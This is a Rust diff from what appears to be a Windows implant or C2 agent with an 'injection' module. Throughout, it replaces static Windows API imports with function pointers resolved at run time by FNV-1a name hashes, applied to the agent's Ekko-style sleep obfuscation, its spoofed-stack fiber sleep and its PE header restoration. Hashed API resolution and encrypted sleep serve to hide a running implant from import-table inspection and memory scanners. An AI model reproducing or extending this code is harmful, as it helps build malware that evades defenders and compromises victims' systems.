@@ -25,15 +25,65 @@ pub fn sleep_with_spoofed_stack(duration_ms: u32) {
     use std::ffi::c_void;
     use std::ptr;
 
-    extern "system" {
-        fn ConvertThreadToFiber(param: *mut c_void) -> *mut c_void;
-        fn CreateFiber(stack_size: usize,
-                       start: unsafe extern "system" fn(*mut c_void),
-                       param: *mut c_void) -> *mut c_void;
-        fn SwitchToFiber(fiber: *mut c_void);
-        fn DeleteFiber(fiber: *mut c_void);
-        fn ConvertFiberToThread() -> i32;
-        fn Sleep(ms: u32);
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ConvertThreadToFiber(param: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ConvertThreadToFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(param) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateFiber(stack_size: usize, start: unsafe extern "system" fn(*mut c_void), param: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(usize, unsafe extern "system" fn(*mut c_void), *mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(stack_size, start, param) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn SwitchToFiber(fiber: *mut c_void) {
+        type F = unsafe extern "system" fn(*mut c_void);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SwitchToFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(fiber) };
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn DeleteFiber(fiber: *mut c_void) {
+        type F = unsafe extern "system" fn(*mut c_void);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(fiber) };
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ConvertFiberToThread() -> i32 {
+        type F = unsafe extern "system" fn() -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ConvertFiberToThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn Sleep(ms: u32) {
+        type F = unsafe extern "system" fn(u32);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Sleep")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(ms) };
     }
 
     #[repr(C)]
@@ -82,8 +132,15 @@ pub fn sleep_with_spoofed_stack(duration_ms: u32) {
 pub fn agent_text_section() -> Option<(*mut u8, usize)> {
     use std::ffi::c_void;
 
-    extern "system" {
-        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetModuleHandleW(name: *const u16) -> *mut c_void {
+        type F = unsafe extern "system" fn(*const u16) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleHandleW")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name) }
     }
 
     #[repr(C)]
@@ -163,32 +220,165 @@ pub fn ekko_sleep(duration_ms: u32) {
     use std::ffi::c_void;
     use std::ptr;
 
-    extern "system" {
-        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
-        fn VirtualProtect(addr: *mut c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> i32;
-        fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize);
-        fn CreateEventA(attrs: *mut c_void, manual_reset: i32, init: i32,
-                        name: *const i8) -> *mut c_void;
-        fn SetEvent(event: *mut c_void) -> i32;
-        fn CloseHandle(h: *mut c_void) -> i32;
-        fn CreateTimerQueue() -> *mut c_void;
-        fn CreateTimerQueueTimer(timer_out: *mut *mut c_void,
-                                 queue:     *mut c_void,
-                                 callback:  Option<unsafe extern "system" fn(*mut c_void, u8)>,
-                                 param:     *mut c_void,
-                                 due_ms:    u32,
-                                 period_ms: u32,
-                                 flags:     u32) -> i32;
-        fn DeleteTimerQueueEx(queue: *mut c_void, completion_event: *mut c_void) -> i32;
-        fn ConvertThreadToFiber(param: *mut c_void) -> *mut c_void;
-        fn CreateFiber(stack: usize,
-                       start: unsafe extern "system" fn(*mut c_void),
-                       param: *mut c_void) -> *mut c_void;
-        fn SwitchToFiber(fiber: *mut c_void);
-        fn DeleteFiber(fiber: *mut c_void);
-        fn ConvertFiberToThread() -> i32;
-        fn WaitForSingleObjectEx(handle: *mut c_void, ms: u32, alertable: i32) -> u32;
-        fn Sleep(ms: u32);
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetModuleHandleW(name: *const u16) -> *mut c_void {
+        type F = unsafe extern "system" fn(*const u16) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleHandleW")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualProtect(addr: *mut c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, size, new_prot, old_prot) }
+    }
+    /// Lazily resolved from ntdll.dll by name hash (import-table hygiene).
+    unsafe fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize) {
+        type F = unsafe extern "system" fn(*mut c_void, *const c_void, usize);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"ntdll.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RtlMoveMemory")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(dst, src, len) };
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateEventA(attrs: *mut c_void, manual_reset: i32, init: i32, name: *const i8) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, i32, i32, *const i8) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateEventA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(attrs, manual_reset, init, name) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn SetEvent(event: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SetEvent")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(event) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CloseHandle(h: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateTimerQueue() -> *mut c_void {
+        type F = unsafe extern "system" fn() -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateTimerQueue")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateTimerQueueTimer(timer_out: *mut *mut c_void, queue:     *mut c_void, callback:  Option<unsafe extern "system" fn(*mut c_void, u8)>, param:     *mut c_void, due_ms:    u32, period_ms: u32, flags:     u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut *mut c_void, *mut c_void, Option<unsafe extern "system" fn(*mut c_void, u8)>, *mut c_void, u32, u32, u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateTimerQueueTimer")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(timer_out, queue, callback, param, due_ms, period_ms, flags) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn DeleteTimerQueueEx(queue: *mut c_void, completion_event: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteTimerQueueEx")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(queue, completion_event) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ConvertThreadToFiber(param: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ConvertThreadToFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(param) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn CreateFiber(stack: usize, start: unsafe extern "system" fn(*mut c_void), param: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(usize, unsafe extern "system" fn(*mut c_void), *mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(stack, start, param) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn SwitchToFiber(fiber: *mut c_void) {
+        type F = unsafe extern "system" fn(*mut c_void);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SwitchToFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(fiber) };
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn DeleteFiber(fiber: *mut c_void) {
+        type F = unsafe extern "system" fn(*mut c_void);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteFiber")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(fiber) };
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn ConvertFiberToThread() -> i32 {
+        type F = unsafe extern "system" fn() -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ConvertFiberToThread")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn WaitForSingleObjectEx(handle: *mut c_void, ms: u32, alertable: i32) -> u32 {
+        type F = unsafe extern "system" fn(*mut c_void, u32, i32) -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WaitForSingleObjectEx")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(handle, ms, alertable) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn Sleep(ms: u32) {
+        type F = unsafe extern "system" fn(u32);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Sleep")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(ms) };
     }
 
     // OS-fixed (winnt.h) values with no typed-config mirror stay const.
@@ -274,9 +464,13 @@ pub fn ekko_sleep(duration_ms: u32) {
 
         // SAFETY: fn(PVOID)->BOOL transmuted to fn(PVOID,BOOLEAN)->void;
         // calling convention is compatible on x86-64 Windows as noted above.
+        // The shim exists because SetEvent is now a lazily-resolved wrapper
+        // (Rust ABI): an ABI-carrying extern "system" fn item is needed for
+        // the callback cast.
+        unsafe extern "system" fn set_event_shim(h: *mut c_void) -> i32 { SetEvent(h) }
         let set_event_cb: Option<unsafe extern "system" fn(*mut c_void, u8)> =
             Some(std::mem::transmute(
-                SetEvent as unsafe extern "system" fn(*mut c_void) -> i32
+                set_event_shim as unsafe extern "system" fn(*mut c_void) -> i32
             ));
 
         let mut wake_timer: *mut c_void = ptr::null_mut();
@@ -346,9 +540,25 @@ pub fn ekko_sleep(duration_ms: u32) {
 #[cfg(target_os = "windows")]
 unsafe fn restore_headers(base: *mut u8, backup: &[u8], size: usize, old_prot: u32) {
     use std::ffi::c_void;
-    extern "system" {
-        fn VirtualProtect(addr: *mut c_void, n: usize, new: u32, old: *mut u32) -> i32;
-        fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize);
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn VirtualProtect(addr: *mut c_void, n: usize, new: u32, old: *mut u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(addr, n, new, old) }
+    }
+    /// Lazily resolved from ntdll.dll by name hash (import-table hygiene).
+    unsafe fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize) {
+        type F = unsafe extern "system" fn(*mut c_void, *const c_void, usize);
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"ntdll.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RtlMoveMemory")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(dst, src, len) };
     }
     RtlMoveMemory(base as *mut c_void, backup.as_ptr() as *const c_void, size);
     let mut tmp = 0u32;
